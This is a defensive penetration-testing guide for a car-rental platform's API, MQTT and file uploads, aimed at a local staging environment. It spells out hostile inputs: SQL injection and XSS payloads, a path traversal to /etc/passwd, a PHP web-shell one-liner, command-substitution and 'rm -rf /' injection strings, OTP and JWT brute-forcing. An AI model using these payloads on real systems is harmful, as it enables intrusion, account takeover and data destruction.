# Penetration Testing Guide

## Overview

Manual penetration testing procedures for CarKid0 Rentals platform.

**Target:** CarKid0 Rentals API and Frontend
**Scope:** All 22 API endpoints, Frontend, Database, Redis, MQTT
**Methodology:** OWASP Testing Guide v4

---

## Pre-Test Setup

### Tools Required
```bash
# Install testing tools
brew install curl jq sqlmap nikto nmap

# Install Burp Suite Community Edition
# Download from: https://portswigger.net/burp/communitydownload

# Install OWASP ZAP
brew install --cask owasp-zap
```

### Test Environment
- Use staging environment (not production)
- Backup database before testing
- Notify team before starting
- Document all findings

---

## Test 1: Authentication Testing

### 1.1 JWT Token Security

**Test JWT Algorithm Confusion:**
```bash
# Get a valid token
TOKEN=$(curl -s -X POST http://localhost:9090/api/v1/auth/verify \
  -H "Content-Type: application/json" \
  -d '{"phone":"+2348012345678","otp":"123456"}' | jq -r '.token')

# Decode token
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq

# Try to change algorithm to 'none'
# Manually edit token header: {"alg":"none","typ":"JWT"}
# Test if server accepts it
```

**Test JWT Expiration:**
```bash
# Wait for token to expire (check exp claim)
# Try to use expired token
curl -H "Authorization: Bearer $EXPIRED_TOKEN" \
  http://localhost:9090/api/v1/lister/dashboard
```

**Test JWT Secret Brute Force:**
```bash
# Use jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py $TOKEN -C -d /path/to/wordlist.txt
```

### 1.2 OTP Bypass

**Test OTP Brute Force:**
```bash
# Try multiple OTP codes rapidly
for i in {000000..999999}; do
  curl -s -X POST http://localhost:9090/api/v1/auth/verify \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"+2348012345678\",\"otp\":\"$i\"}"
  # Should be rate limited after 3-5 attempts
done
```

**Test OTP Reuse:**
```bash
# Use same OTP twice
OTP="123456"
curl -X POST http://localhost:9090/api/v1/auth/verify \
  -d "{\"phone\":\"+2348012345678\",\"otp\":\"$OTP\"}"

# Try again with same OTP
curl -X POST http://localhost:9090/api/v1/auth/verify \
  -d "{\"phone\":\"+2348012345678\",\"otp\":\"$OTP\"}"
# Should fail
```

---

## Test 2: SQL Injection

### 2.1 Automated Scanning

**Using SQLMap:**
```bash
# Test login endpoint
sqlmap -u "http://localhost:9090/api/v1/auth/login" \
  --data='{"phone":"test"}' \
  --method=POST \
  --headers="Content-Type: application/json" \
  --level=5 \
  --risk=3

# Test GET endpoints
sqlmap -u "http://localhost:9090/api/v1/listings?id=1" \
  --level=5 \
  --risk=3
```

### 2.2 Manual Testing

**Test Query Parameters:**
```bash
# Boolean-based blind
curl "http://localhost:9090/api/v1/listings?id=1' AND '1'='1"
curl "http://localhost:9090/api/v1/listings?id=1' AND '1'='2"

# Time-based blind
curl "http://localhost:9090/api/v1/listings?id=1' AND SLEEP(5)--"

# Union-based
curl "http://localhost:9090/api/v1/listings?id=1' UNION SELECT NULL--"
```

**Test POST Body:**
```bash
# JSON injection
curl -X POST http://localhost:9090/api/v1/bookings \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"listingId":"1\" OR \"1\"=\"1","startDate":"2024-01-01"}'
```

---

## Test 3: Authorization Testing

### 3.1 Horizontal Privilege Escalation

**Test accessing other users' data:**
```bash
# Login as User A
TOKEN_A=$(curl -s -X POST http://localhost:9090/api/v1/auth/verify \
  -d '{"phone":"+2348012345678","otp":"123456"}' | jq -r '.token')

# Get User A's bookings
curl -H "Authorization: Bearer $TOKEN_A" \
  http://localhost:9090/api/v1/bookings?userId=user-a-id

# Try to access User B's bookings with User A's token
curl -H "Authorization: Bearer $TOKEN_A" \
  http://localhost:9090/api/v1/bookings?userId=user-b-id
# Should be denied
```

### 3.2 Vertical Privilege Escalation

**Test role escalation:**
```bash
# Login as regular user
TOKEN_USER=$(curl -s -X POST http://localhost:9090/api/v1/auth/verify \
  -d '{"phone":"+2348012345678","otp":"123456"}' | jq -r '.token')

# Try to access admin endpoint
curl -H "Authorization: Bearer $TOKEN_USER" \
  http://localhost:9090/api/v1/admin/active-rentals
# Should be denied

# Try to change own role
curl -X PATCH http://localhost:9090/api/v1/auth/role \
  -H "Authorization: Bearer $TOKEN_USER" \
  -d '{"role":"admin"}'
# Should be denied
```

---

## Test 4: Input Validation

### 4.1 XSS Testing

**Test reflected XSS:**
```bash
# In query parameters
curl "http://localhost:9090/api/v1/listings?search=<script>alert(1)</script>"

# In POST body
curl -X POST http://localhost:9090/api/v1/bookings \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"fullName":"<script>alert(1)</script>"}'
```

**Test stored XSS:**
```bash
# Create listing with XSS payload
curl -X POST http://localhost:9090/api/v1/listings \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"title":"<img src=x onerror=alert(1)>","description":"test"}'

# Retrieve listing and check if payload executed
```

### 4.2 Command Injection

**Test file path traversal:**
```bash
# Try to access system files
curl "http://localhost:9090/api/v1/files?path=../../../../etc/passwd"

# Try command injection in file upload
curl -X POST http://localhost:9090/api/v1/upload \
  -F "file=@test.txt;filename=test.txt;$(whoami).txt"
```

### 4.3 Buffer Overflow

**Test with extremely long inputs:**
```bash
# Generate 10MB string
LONG_STRING=$(python3 -c "print('A' * 10000000)")

curl -X POST http://localhost:9090/api/v1/auth/login \
  -d "{\"phone\":\"$LONG_STRING\"}"
# Should return 400, not 500
```

---

## Test 5: Business Logic Flaws

### 5.1 Race Conditions

**Test concurrent bookings:**
```bash
# Try to book same vehicle twice simultaneously
for i in {1..10}; do
  curl -X POST http://localhost:9090/api/v1/bookings \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"listingId":"same-vehicle","startDate":"2024-01-01"}' &
done
wait
# Only one should succeed
```

### 5.2 Price Manipulation

**Test negative prices:**
```bash
curl -X POST http://localhost:9090/api/v1/bookings \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"listingId":"vehicle-1","pricePerDay":-100}'
# Should be rejected
```

### 5.3 Time Manipulation

**Test rental time bypass:**
```bash
# Try to set end time before start time
curl -X POST http://localhost:9090/api/v1/bookings \
  -d '{"startDate":"2024-12-31","endDate":"2024-01-01"}'
# Should be rejected

# Try to extend rental without payment
curl -X PATCH http://localhost:9090/api/v1/bookings/booking-id \
  -d '{"endDate":"2025-12-31"}'
# Should require payment
```

---

## Test 6: API Security

### 6.1 Rate Limiting

**Test rate limits:**
```bash
# Rapid fire requests
for i in {1..1000}; do
  curl -s http://localhost:9090/api/v1/listings > /dev/null &
done
wait
# Should get 429 responses
```

### 6.2 CORS Misconfiguration

**Test CORS bypass:**
```bash
# Try from different origin
curl -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization" \
  -X OPTIONS \
  http://localhost:9090/api/v1/bookings

# Check Access-Control-Allow-Origin header
# Should not be * or evil.com
```

### 6.3 HTTP Methods

**Test unsupported methods:**
```bash
# Try TRACE method
curl -X TRACE http://localhost:9090/api/v1/listings

# Try PUT on POST-only endpoint
curl -X PUT http://localhost:9090/api/v1/auth/login

# Try DELETE without authorization
curl -X DELETE http://localhost:9090/api/v1/bookings/booking-id
```

---

## Test 7: Session Management

### 7.1 Session Fixation

**Test session fixation:**
```bash
# Get session before login
SESSION_ID=$(curl -c cookies.txt http://localhost:9090/health)

# Login with fixed session
curl -b cookies.txt -X POST http://localhost:9090/api/v1/auth/verify \
  -d '{"phone":"+2348012345678","otp":"123456"}'

# Check if session ID changed
# Should get new session after login
```

### 7.2 Session Hijacking

**Test session token in URL:**
```bash
# Check if token ever appears in URL
# Should only be in Authorization header
```

---

## Test 8: File Upload Security

### 8.1 Malicious File Upload

**Test file type bypass:**
```bash
# Upload PHP file as image
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
curl -X POST http://localhost:9090/api/v1/upload \
  -F "file=@shell.php;type=image/jpeg"
# Should be rejected

# Upload with double extension
curl -X POST http://localhost:9090/api/v1/upload \
  -F "file=@shell.php.jpg"
# Should be rejected
```

### 8.2 File Size Limits

**Test file size bypass:**
```bash
# Create 100MB file
dd if=/dev/zero of=large.mp4 bs=1M count=100

# Try to upload
curl -X POST http://localhost:9090/api/v1/upload \
  -F "file=@large.mp4"
# Should be rejected if over limit
```

---

## Test 9: Information Disclosure

### 9.1 Error Messages

**Test verbose errors:**
```bash
# Trigger database error
curl "http://localhost:9090/api/v1/listings?id=invalid"

# Trigger application error
curl -X POST http://localhost:9090/api/v1/bookings \
  -d "invalid json"

# Check if stack traces or file paths exposed
```

### 9.2 Directory Listing

**Test directory traversal:**
```bash
# Try to list directories
curl http://localhost:9090/
curl http://localhost:9090/api/
curl http://localhost:9090/uploads/

# Should not show directory listings
```

---

## Test 10: MQTT/IoT Security

### 10.1 MQTT Authentication

**Test MQTT without auth:**
```bash
# Install mosquitto client
brew install mosquitto

# Try to connect without credentials
mosquitto_sub -h localhost -p 1883 -t "vehicles/#"
# Should be rejected

# Try with weak credentials
mosquitto_sub -h localhost -p 1883 -u "admin" -P "admin" -t "vehicles/#"
# Should be rejected
```

### 10.2 Command Injection

**Test vehicle command injection:**
```bash
# Try to inject malicious command
curl -X POST http://localhost:9090/api/v1/iot/command \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"vehicleId":"v-001","command":"UNLOCK; rm -rf /"}'
# Should be sanitized
```

---

## Reporting Template

### Vulnerability Report

**Title:** [Vulnerability Name]

**Severity:** Critical / High / Medium / Low

**Description:**
[Detailed description of the vulnerability]

**Steps to Reproduce:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Impact:**
[What an attacker could do with this vulnerability]

**Proof of Concept:**
```bash
[Commands or code to reproduce]
```

**Recommendation:**
[How to fix the vulnerability]

**References:**
- [OWASP link]
- [CVE link if applicable]

---

## Post-Test Actions

1. Document all findings
2. Prioritize by severity
3. Create fix tickets
4. Verify fixes
5. Re-test after fixes
6. Update security documentation

---

## Next Steps

1. Run automated audit: `./tests/security/run_security_audit.sh`
2. Review checklist: `tests/security/SECURITY_CHECKLIST.md`
3. Perform manual penetration tests (this guide)
4. Document all findings
5. Fix critical and high severity issues
6. Re-test after fixes
7. Sign off on security audit
